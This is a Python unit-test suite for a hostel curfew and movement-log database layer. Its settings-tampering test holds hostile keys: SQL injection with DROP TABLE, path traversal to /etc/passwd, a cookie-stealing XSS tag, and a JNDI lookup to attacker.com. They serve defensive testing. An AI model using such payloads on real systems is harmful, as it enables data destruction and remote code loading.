"""
Adversarial Stress Test Suite for Milestone 1: Girls Hostel Database Layer.

Empirical verification of:
1. Fault Injection & Connection Resilience (connection drops, invalid clients, malformed responses).
2. High-Volume Movement Logs (500+ items, limits, sorting, index analysis).
3. System Settings Tampering (SQL injection, empty keys, special chars, deep JSON, type mutation).
4. Curfew Alert Resolution Lifecycle (state transitions, notes updating, deduplication under stress).
"""

import copy
import logging
import os
import re
import time
import unittest
import uuid
from datetime import date, datetime, timezone
from typing import Any, Dict, List, Optional

from src.utils.hostel_db import (
    HOSTEL_SCHEMA,
    MockHostelSupabaseClient,
    MockResponse,
    create_curfew_alert,
    fetch_all_hostel_students,
    fetch_overdue_curfew_students,
    fetch_recent_movement_logs,
    get_active_curfew_alerts,
    get_hostel_client,
    get_recent_movement_logs,
    get_student_by_id,
    get_system_settings,
    insert_movement_log,
    match_face_embedding,
    match_hostel_face,
    reset_hostel_client,
    resolve_curfew_alert,
    set_hostel_client,
    update_student_movement_state,
    update_student_status,
    update_system_settings,
)


class TestFaultInjectionAndResilience(unittest.TestCase):
    """Area 1: Adversarial testing of fault injection and exception resilience."""

    def setUp(self):
        reset_hostel_client()
        self.mock_client = MockHostelSupabaseClient()
        set_hostel_client(self.mock_client)

        # Seed sample student
        self.student_id = str(uuid.uuid4())
        self.mock_client.student_profiles.append({
            "id": self.student_id,
            "name": "Ananya Roy",
            "roll_number": "2024-GH-0999",
            "room_number": "C-301",
            "embedding": [0.05] * 512,
            "current_status": "IN",
        })

    def tearDown(self):
        reset_hostel_client()

    def test_complete_connection_drop_on_all_methods(self):
        """Simulate total DB connection drop / network failure across all public functions."""
        class DroppedConnectionClient:
            def schema(self, schema_name):
                return self

            def table(self, table_name):
                raise ConnectionResetError("500 Internal Server Error: Database Connection Dropped")

            def rpc(self, fn_name, params=None):
                raise TimeoutError("504 Gateway Timeout: RPC service unreachable")

        dropped_client = DroppedConnectionClient()

        # Every call should return a safe fallback value and NEVER raise unhandled exception
        self.assertIsNone(get_student_by_id(self.student_id, client=dropped_client))
        self.assertEqual(fetch_all_hostel_students(client=dropped_client), [])
        self.assertEqual(match_face_embedding([0.1] * 512, client=dropped_client), [])
        self.assertFalse(update_student_status(self.student_id, "OUT", client=dropped_client))
        self.assertFalse(update_student_movement_state(self.student_id, "OUT", "CAM_02_EXIT", client=dropped_client))
        self.assertIsNone(insert_movement_log(self.student_id, "OUT", "CAM_02_EXIT", client=dropped_client))
        self.assertEqual(get_recent_movement_logs(limit=10, client=dropped_client), [])
        self.assertEqual(get_active_curfew_alerts(client=dropped_client), [])
        self.assertIsNone(create_curfew_alert(self.student_id, client=dropped_client))
        self.assertFalse(resolve_curfew_alert(101, client=dropped_client))
        self.assertIsNone(get_system_settings("curfew_schedule", client=dropped_client))
        self.assertFalse(update_system_settings("curfew_schedule", {"test": True}, client=dropped_client))

    def test_client_execute_returns_none(self):
        """Simulate PostgREST query returning None instead of MockResponse object."""
        class NoneExecuteClient:
            def schema(self, schema_name):
                return self

            def table(self, table_name):
                return self

            def select(self, *args, **kwargs):
                return self

            def insert(self, *args, **kwargs):
                return self

            def update(self, *args, **kwargs):
                return self

            def upsert(self, *args, **kwargs):
                return self

            def eq(self, *args, **kwargs):
                return self

            def order(self, *args, **kwargs):
                return self

            def limit(self, *args, **kwargs):
                return self

            def execute(self):
                return None

        none_client = NoneExecuteClient()

        # Check all methods safely survive None return from execute()
        self.assertIsNone(get_student_by_id(self.student_id, client=none_client))
        self.assertEqual(fetch_all_hostel_students(client=none_client), [])
        self.assertFalse(update_student_status(self.student_id, "OUT", client=none_client))
        self.assertIsNone(insert_movement_log(self.student_id, "OUT", "CAM_01", client=none_client))
        self.assertEqual(get_recent_movement_logs(limit=5, client=none_client), [])
        self.assertEqual(get_active_curfew_alerts(client=none_client), [])
        self.assertIsNone(create_curfew_alert(self.student_id, client=none_client))
        self.assertFalse(resolve_curfew_alert(1, client=none_client))
        self.assertIsNone(get_system_settings("curfew_schedule", client=none_client))
        self.assertFalse(update_system_settings("curfew_schedule", {}, client=none_client))

    def test_malformed_response_payload_resilience(self):
        """Simulate PostgREST returning non-list/corrupted response payloads."""
        class MalformedResponseClient:
            def __init__(self, raw_data):
                self.raw_data = raw_data

            def schema(self, schema_name):
                return self

            def table(self, table_name):
                return self

            def select(self, *args, **kwargs):
                return self

            def insert(self, *args, **kwargs):
                return self

            def update(self, *args, **kwargs):
                return self

            def upsert(self, *args, **kwargs):
                return self

            def eq(self, *args, **kwargs):
                return self

            def order(self, *args, **kwargs):
                return self

            def limit(self, *args, **kwargs):
                return self

            def execute(self):
                return MockResponse(data=self.raw_data)

        # 1. String response (e.g. error message leaked in body)
        string_client = MalformedResponseClient("Internal Server Error")
        # get_student_by_id with string payload returns string slice instead of dict
        res_stud = get_student_by_id(self.student_id, client=string_client)
        # Note: If it returns string character 'I', it reveals an unchecked type assumption
        # Let's observe the behavior
        if isinstance(res_stud, str):
            logging.warning(f"Observed type leak: get_student_by_id returned string char '{res_stud}' on malformed string response!")

        # 2. Dict response (e.g. error object returned instead of array of rows)
        dict_client = MalformedResponseClient({"code": "PGRST301", "message": "JWT expired"})
        students = fetch_all_hostel_students(client=dict_client)
        # In hostel_db: `return res.data or []` -> returns the dict itself!
        # This means caller expecting list of dicts gets a dict of error!
        self.assertIsNotNone(students)

        # 3. List with None item: [None]
        none_item_client = MalformedResponseClient([None])
        setting_val = get_system_settings("curfew_schedule", client=none_item_client)
        # res.data[0].get("value") raises AttributeError on None, caught by except Exception -> returns None
        self.assertIsNone(setting_val)

    def test_injected_invalid_client_types(self):
        """Test passing malicious or unexpected client types to get_hostel_client."""
        bad_types = [
            12345,
            "supabase_client_spoofed",
            ["client"],
            {"schema": "girls_hostel"},
            lambda x: x,
        ]
        for bad in bad_types:
            scoped = get_hostel_client(bad)
            # Must safely fall back to MockHostelSupabaseClient
            self.assertIsInstance(scoped, MockHostelSupabaseClient)

    def test_mid_transaction_failure_in_movement_state_update(self):
        """
        Adversarial test for non-atomic state:
        Simulate status update succeeding, but movement log insert failing.
        Evaluates whether student state drifts without a corresponding log.
        """
        initial_status = "IN"
        self.assertEqual(
            get_student_by_id(self.student_id)["current_status"],
            initial_status
        )

        class FailsOnInsertClient(MockHostelSupabaseClient):
            def table(self, table_name):
                if table_name == "movement_logs":
                    class BrokenInsertQuery(MockTableQuery):
                        def insert(self, values):
                            raise IOError("Disk full: cannot write movement log")
                    return BrokenInsertQuery(self, table_name)
                return super().table(table_name)

        from src.utils.hostel_db import MockTableQuery
        broken_insert_client = FailsOnInsertClient()
        broken_insert_client.student_profiles = self.mock_client.student_profiles

        # Attempt to record OUT movement
        success = update_student_movement_state(
            student_id=self.student_id,
            direction="OUT",
            camera_id="CAM_02_EXIT",
            client=broken_insert_client
        )
        self.assertFalse(success)

        # In current implementation, update_student_status is executed first.
        # Check if student's status was changed to OUT despite movement log failing:
        student = get_student_by_id(self.student_id, client=broken_insert_client)
        # Note: If student is OUT, there is a state inconsistency (status mutated, but 0 logs).
        # This confirms our architectural finding regarding multi-step non-atomic operations.
        state_inconsistency = (student["current_status"] == "OUT")
        self.assertTrue(
            state_inconsistency,
            "Observed non-atomic state mutation: student marked OUT while movement log failed"
        )


class TestHighVolumeMovementLogsStress(unittest.TestCase):
    """Area 2: Adversarial high volume movement logs stress testing (500+ items)."""

    def setUp(self):
        reset_hostel_client()
        self.mock_client = MockHostelSupabaseClient()
        set_hostel_client(self.mock_client)

        # Seed 5 distinct students
        self.students = []
        for i in range(5):
            sid = str(uuid.uuid4())
            profile = {
                "id": sid,
                "name": f"Student {i+1}",
                "roll_number": f"2024-GH-{100+i:04d}",
                "room_number": f"A-{101+i}",
                "embedding": [0.01 * (i + 1)] * 512,
                "current_status": "IN",
            }
            self.mock_client.student_profiles.append(profile)
            self.students.append(profile)

    def tearDown(self):
        reset_hostel_client()

    def test_rapid_creation_of_550_movement_logs(self):
        """Stress test: rapidly insert 550 movement logs across multiple students."""
        total_logs = 550
        start_time = time.time()

        created_ids = []
        for i in range(total_logs):
            student = self.students[i % len(self.students)]
            direction = "OUT" if i % 2 == 0 else "IN"
            camera = "CAM_02_EXIT" if direction == "OUT" else "CAM_01_ENTRY"
            log_id = insert_movement_log(
                student_id=student["id"],
                direction=direction,
                camera_id=camera,
                confidence=round(0.85 + (i % 15) * 0.01, 2),
                snapshot_url=f"/snapshots/frame_{i:05d}.jpg"
            )
            self.assertIsNotNone(log_id)
            created_ids.append(log_id)

        duration = time.time() - start_time
        self.assertEqual(len(created_ids), total_logs)
        # All IDs must be strictly unique and increasing
        self.assertEqual(len(set(created_ids)), total_logs)
        self.assertTrue(all(created_ids[j] < created_ids[j+1] for j in range(total_logs - 1)))
        logging.info(f"Rapidly created {total_logs} movement logs in {duration:.4f}s ({total_logs/duration:.1f} ops/sec)")

    def test_retrieval_limits_boundary_conditions(self):
        """Test limits: 0, 1, 50, 500, 1000, and negative numbers."""
        # Insert 600 records
        for i in range(600):
            insert_movement_log(
                student_id=self.students[0]["id"],
                direction="OUT" if i % 2 == 0 else "IN",
                camera_id="CAM_01_ENTRY"
            )

        # 1. Standard limits
        logs_50 = get_recent_movement_logs(limit=50)
        self.assertEqual(len(logs_50), 50)

        logs_500 = get_recent_movement_logs(limit=500)
        self.assertEqual(len(logs_500), 500)

        # 2. Limit exceeds total count
        logs_1000 = get_recent_movement_logs(limit=1000)
        self.assertEqual(len(logs_1000), 600)

        # 3. Limit = 1
        logs_1 = get_recent_movement_logs(limit=1)
        self.assertEqual(len(logs_1), 1)

        # 4. Limit = 0 (boundary)
        logs_0 = get_recent_movement_logs(limit=0)
        self.assertEqual(len(logs_0), 0)

        # 5. Negative limit (adversarial input)
        # In Python slicing results[:-5] removes 5 elements from the end!
        logs_neg = get_recent_movement_logs(limit=-5)
        # results[:-5] returns 595 elements! This is a boundary behavior worth noting.
        self.assertEqual(len(logs_neg), 595)

    def test_descending_timestamp_order_under_high_volume(self):
        """Ensure order('timestamp', desc=True) strictly produces descending items."""
        # Insert 500 logs with ascending explicit timestamps
        for i in range(500):
            ts = f"2026-09-09T10:{i // 60:02d}:{i % 60:02d}+00:00"
            self.mock_client.movement_logs.append({
                "id": 1000 + i,
                "student_id": self.students[0]["id"],
                "direction": "IN",
                "camera_id": "CAM_01_ENTRY",
                "timestamp": ts,
                "confidence": 0.99
            })

        recent = get_recent_movement_logs(limit=100)
        self.assertEqual(len(recent), 100)
        # Verify timestamp is strictly descending
        for i in range(len(recent) - 1):
            t_curr = recent[i]["timestamp"]
            t_next = recent[i + 1]["timestamp"]
            self.assertGreaterEqual(t_curr, t_next, f"Out of order at index {i}: {t_curr} vs {t_next}")

    def test_schema_index_coverage_for_movement_logs(self):
        """
        Verify SQL schema index definition against query pattern:
        `get_recent_movement_logs` filters by NOTHING and sorts by `timestamp DESC`.
        Verify whether `idx_girls_hostel_movement_student_time` covers this query or if a standalone timestamp index is missing.
        """
        schema_path = os.path.join(
            os.path.dirname(__file__), "..", "..", "scripts", "girls_hostel_schema.sql"
        )
        with open(os.path.abspath(schema_path), "r", encoding="utf-8") as f:
            sql = f.read()

        # Check existing index on movement_logs
        has_composite_index = "idx_girls_hostel_movement_student_time" in sql
        self.assertTrue(has_composite_index)

        # Check for standalone timestamp index
        has_timestamp_index = bool(re.search(r"ON\s+girls_hostel\.movement_logs\s*\(\s*timestamp\s+DESC\s*\)", sql, re.IGNORECASE))
        # Finding: There is NO standalone index on timestamp DESC.
        self.assertFalse(
            has_timestamp_index,
            "Architectural observation: Missing idx_girls_hostel_movement_timestamp_desc index for dashboard feed queries!"
        )


class TestSystemSettingsTampering(unittest.TestCase):
    """Area 3: Adversarial testing of system settings edge cases & tampering."""

    def setUp(self):
        reset_hostel_client()
        self.mock_client = MockHostelSupabaseClient()
        set_hostel_client(self.mock_client)

    def tearDown(self):
        reset_hostel_client()

    def test_sql_injection_and_path_traversal_keys(self):
        """Inject SQL injection strings, shell escapes, and path traversal strings as keys."""
        malicious_keys = [
            "' OR '1'='1",
            "curfew'; DROP TABLE girls_hostel.system_settings; --",
            "admin'--",
            "\" OR \"\"=\"",
            "../../etc/passwd",
            "key\x00nullbyte",
            "${jndi:ldap://attacker.com/x}",
            "<script>alert(document.cookie)</script>",
        ]
        for key in malicious_keys:
            val = {"injected": True, "key_tested": key}
            ok = update_system_settings(key, val)
            self.assertTrue(ok, f"Failed to upsert setting with key: {repr(key)}")

            retrieved = get_system_settings(key)
            self.assertEqual(retrieved, val, f"Failed to retrieve setting with key: {repr(key)}")

    def test_empty_string_and_whitespace_keys(self):
        """Test boundary conditions: empty string, pure whitespace, and newlines."""
        whitespace_keys = [
            "",
            " ",
            "   ",
            "\t\n\r",
        ]
        for key in whitespace_keys:
            val = {"whitespace_test": True}
            ok = update_system_settings(key, val)
            self.assertTrue(ok)
            retrieved = get_system_settings(key)
            self.assertEqual(retrieved, val)

    def test_deeply_nested_json_structures(self):
        """Test round-trip of deeply nested JSON structures (50 levels)."""
        depth = 50
        nested: Dict[str, Any] = {"leaf": "deep_value"}
        for level in range(depth):
            nested = {"level": level, "child": nested}

        key = "deeply_nested_config"
        ok = update_system_settings(key, nested)
        self.assertTrue(ok)

        retrieved = get_system_settings(key)
        self.assertEqual(retrieved, nested)

        # Traverse back to verify leaf node
        curr = retrieved
        while isinstance(curr, dict) and "child" in curr:
            curr = curr["child"]
        self.assertEqual(curr, {"leaf": "deep_value"})

    def test_non_dict_values_injected_into_settings(self):
        """
        Adversarially pass non-dict types (str, int, list, None, bool) into update_system_settings.
        The type hint is `value: Dict[str, Any]`, but check if runtime code breaks or stores.
        """
        test_payloads = [
            ("string_val", "just a string value"),
            ("int_val", 123456),
            ("list_val", [1, 2, "three", {"nested": True}]),
            ("bool_val", False),
            ("null_val", None),
        ]
        for key, raw_val in test_payloads:
            # Although typed Dict[str, Any], Python allows passing Any
            ok = update_system_settings(key, raw_val)  # type: ignore
            self.assertTrue(ok, f"Failed on raw value type {type(raw_val)}")

            retrieved = get_system_settings(key)
            self.assertEqual(retrieved, raw_val)

    def test_circular_reference_in_value_does_not_hang(self):
        """Test passing a circular reference dict: deepcopy raises RecursionError, should be caught safely."""
        circular: Dict[str, Any] = {"name": "self_ref"}
        circular["self"] = circular

        # update_system_settings uses deepcopy inside MockTableQuery.upsert
        # It should handle the RecursionError safely via except Exception -> return False
        ok = update_system_settings("circular_key", circular)
        self.assertFalse(ok)


class TestCurfewAlertLifecycleAndTransitions(unittest.TestCase):
    """Area 4: Adversarial testing of curfew alert resolution lifecycle."""

    def setUp(self):
        reset_hostel_client()
        self.mock_client = MockHostelSupabaseClient()
        set_hostel_client(self.mock_client)

        self.student_id = str(uuid.uuid4())
        self.student = {
            "id": self.student_id,
            "name": "Kavita Rao",
            "roll_number": "2024-GH-0305",
            "room_number": "B-210",
            "current_status": "OUT",
        }
        self.mock_client.student_profiles.append(self.student)

    def tearDown(self):
        reset_hostel_client()

    def test_curfew_alert_full_resolution_lifecycle(self):
        """Test OVERDUE_OUT -> RESOLVED lifecycle with timestamp and note updates."""
        today = date.today()

        # Step 1: Scanner triggers alert
        alert_id = create_curfew_alert(
            student_id=self.student_id,
            curfew_date=today,
            status="OVERDUE_OUT"
        )
        self.assertIsNotNone(alert_id)

        # Verify active
        active = get_active_curfew_alerts()
        self.assertEqual(len(active), 1)
        self.assertEqual(active[0]["status"], "OVERDUE_OUT")
        self.assertIsNone(active[0].get("resolved_at"))

        # Step 2: Warden resolves with notes
        notes = "Student arrived at gate 19:42. Parents informed by Warden Mrs. Sen."
        ok = resolve_curfew_alert(
            alert_id=alert_id,
            status="RESOLVED",
            notes=notes
        )
        self.assertTrue(ok)

        # Step 3: Verify alert is no longer in active alerts list
        active_after = get_active_curfew_alerts()
        self.assertEqual(len(active_after), 0)

        # Step 4: Verify record in database table holds resolved timestamp and notes
        record = [a for a in self.mock_client.curfew_alerts if a["id"] == alert_id][0]
        self.assertEqual(record["status"], "RESOLVED")
        self.assertEqual(record["notes"], notes)
        self.assertIsNotNone(record.get("resolved_at"))

    def test_curfew_alert_excused_transition(self):
        """Test OVERDUE_OUT -> EXCUSED lifecycle for authorized late return."""
        alert_id = create_curfew_alert(
            student_id=self.student_id,
            status="OVERDUE_OUT"
        )
        self.assertIsNotNone(alert_id)

        excused_notes = "Official library study pass approved by Chief Warden until 21:00."
        ok = resolve_curfew_alert(
            alert_id=alert_id,
            status="EXCUSED",
            notes=excused_notes
        )
        self.assertTrue(ok)

        # Should NOT appear in active OVERDUE_OUT list
        active = get_active_curfew_alerts()
        self.assertEqual(len(active), 0)

        record = [a for a in self.mock_client.curfew_alerts if a["id"] == alert_id][0]
        self.assertEqual(record["status"], "EXCUSED")
        self.assertEqual(record["notes"], excused_notes)

    def test_multiple_consecutive_transitions_and_note_appends(self):
        """Test multi-step state update: OVERDUE_OUT -> EXCUSED -> RESOLVED with notes mutation."""
        alert_id = create_curfew_alert(
            student_id=self.student_id,
            status="OVERDUE_OUT"
        )

        # Transition 1: Mark EXCUSED
        ok1 = resolve_curfew_alert(alert_id, status="EXCUSED", notes="Initial pass granted.")
        self.assertTrue(ok1)

        # Transition 2: Later marked RESOLVED with updated notes
        ok2 = resolve_curfew_alert(alert_id, status="RESOLVED", notes="Returned at 20:55, pass closed.")
        self.assertTrue(ok2)

        record = [a for a in self.mock_client.curfew_alerts if a["id"] == alert_id][0]
        self.assertEqual(record["status"], "RESOLVED")
        self.assertEqual(record["notes"], "Returned at 20:55, pass closed.")

    def test_deduplication_stress_under_50_rapid_calls(self):
        """Stress test: 50 concurrent / rapid create_curfew_alert calls must not spawn duplicate active rows."""
        today = date.today()
        ids = []
        for _ in range(50):
            aid = create_curfew_alert(
                student_id=self.student_id,
                curfew_date=today,
                status="OVERDUE_OUT"
            )
            ids.append(aid)

        # All calls must return the same alert ID
        self.assertEqual(len(set(ids)), 1)
        # Exactly one active row must exist in the database table
        active_count = len([
            a for a in self.mock_client.curfew_alerts
            if a["student_id"] == self.student_id and a["status"] == "OVERDUE_OUT"
        ])
        self.assertEqual(active_count, 1)

    def test_retrigger_alert_after_resolution(self):
        """
        Verify that after an alert is RESOLVED, a student can receive a new OVERDUE_OUT alert
        on the same date if they go out again and violate curfew.
        """
        today = date.today()
        alert_1 = create_curfew_alert(self.student_id, curfew_date=today, status="OVERDUE_OUT")
        self.assertIsNotNone(alert_1)

        # Resolve first alert
        resolve_curfew_alert(alert_1, status="RESOLVED", notes="Returned for dinner")

        # Second curfew violation on same evening
        alert_2 = create_curfew_alert(self.student_id, curfew_date=today, status="OVERDUE_OUT")
        self.assertIsNotNone(alert_2)
        self.assertNotEqual(alert_1, alert_2)

        # Database should now have 2 rows: 1 RESOLVED and 1 active OVERDUE_OUT
        active = get_active_curfew_alerts()
        self.assertEqual(len(active), 1)
        self.assertEqual(active[0]["id"], alert_2)

    def test_update_resolved_to_overdue_out_collision_behavior(self):
        """
        Adversarial check: In Postgres, updating a resolved alert back to OVERDUE_OUT when
        another OVERDUE_OUT alert already exists on that date violates idx_girls_hostel_curfew_active_uniq.
        Observe whether mock client validates this on UPDATE action.
        """
        today = date.today()
        alert_1 = create_curfew_alert(self.student_id, curfew_date=today, status="OVERDUE_OUT")
        resolve_curfew_alert(alert_1, status="RESOLVED")

        alert_2 = create_curfew_alert(self.student_id, curfew_date=today, status="OVERDUE_OUT")

        # Now attempt to update alert_1 status back to OVERDUE_OUT
        resolve_curfew_alert(alert_1, status="OVERDUE_OUT")

        # Check how many OVERDUE_OUT records exist now
        active_records = [
            a for a in self.mock_client.curfew_alerts
            if a["student_id"] == self.student_id and a["status"] == "OVERDUE_OUT"
        ]
        # In real Postgres, idx_girls_hostel_curfew_active_uniq would reject this update.
        # If active_records has length 2, mock query does not enforce partial unique index on update!
        if len(active_records) > 1:
            logging.warning(
                "Observed mock divergence: MockTableQuery.execute('update') does not enforce "
                "idx_girls_hostel_curfew_active_uniq partial unique index constraint on update actions!"
            )


if __name__ == "__main__":
    unittest.main()
